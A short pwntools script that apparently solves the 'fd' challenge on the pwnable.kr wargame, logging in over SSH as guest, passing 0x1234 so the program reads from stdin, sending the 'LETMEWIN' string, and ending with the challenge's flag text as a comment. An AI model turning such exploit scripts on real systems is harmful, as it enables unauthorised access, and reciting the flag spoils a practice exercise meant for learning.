from pwn import *


con = ssh("fd", "pwnable.kr", 2222, "guest")
argv = ["/home/fd/fd", str(0x1234)]
sh = con.process(argv, executable=argv[0])
sh.sendline("LETMEWIN")
print(sh.recvall())

# mommy! I think I know what a file descriptor is!!
